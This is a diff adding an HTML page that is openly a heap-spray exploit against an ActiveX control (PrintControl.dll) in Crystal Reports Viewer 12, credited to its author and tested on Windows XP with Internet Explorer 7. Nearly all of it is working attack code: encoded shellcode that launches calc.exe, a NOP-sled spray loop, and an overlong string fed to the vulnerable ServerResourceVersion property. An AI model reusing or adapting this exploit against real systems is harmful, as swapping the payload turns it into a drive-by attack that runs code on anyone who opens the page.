@@ -1,0 +1,43 @@
+<!--
+Crystal Reports Viewer 12.0.0.549 Activex Exploit (PrintControl.dll) 0-day
+By = Dr_IDE
+File = "C:\Program Files\BusinessObjects\Common\4.0\crystalreportviewers12\ActiveXControls\PrintControl.dll"
+method = "ServerResourceVersion"
+progid = "CrystalPrintControlLib.CrystalPrintControl"
+Site = http://www.sap.com
+Tested On = Windows XPSP3 VM with IE 7.0.5730.13
+Notes = In my testing it was not 100% reliable.
+-->
+
+
+<html>
+<object id='target' classid='clsid:88DD90B6-C770-4CFF-B7A4-3AFD16BB8824'></object>
+<script>
+//payload is windows/exec cmd=calc.exe
+shellcode = unescape(
+'%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+
+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+
+'%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+
+'%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+
+'%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+
+'%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+
+'%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+
+'%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');
+
+nops=unescape('%u9090%u9090');
+headersize = 20;
+slackspace= headersize + shellcode.length;
+
+while(nops.length < slackspace) nops+= nops;
+fillblock= nops.substring(0, slackspace);
+block= nops.substring(0, nops.length- slackspace);
+while( block.length+ slackspace<0x40000) block= block+ block+fillblock;
+memory=new Array();
+for( counter=0; counter<300; counter++) memory[counter]= block +shellcode;
+ret='';
+for( counter=0; counter<=2000; counter++)
+ret+=unescape('%u0A0A%u0A0A');
+
+target.ServerResourceVersion = ret;
+</script>
+</html>
